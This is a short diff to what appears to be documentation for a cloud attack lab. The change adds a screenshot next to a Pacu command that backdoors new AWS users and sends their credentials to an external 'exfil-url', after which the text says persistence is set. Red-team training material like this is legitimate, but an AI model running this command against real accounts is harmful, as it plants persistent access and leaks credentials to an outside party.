@@ -388,6 +388,9 @@ Once you have the above values run the below in pacu.  You will be prompted for 
 
     run lambda__backdoor_new_users --exfil-url https://commander-api.vectratme.com/adduser
 
+.. figure:: ./images/LambdaBackdoor.png
+   :alt: LambdaBackdoor
+   
 Persistence has been set. Lets create a new user to test it (you don't need to leave pacu)
 
 .. code:: console
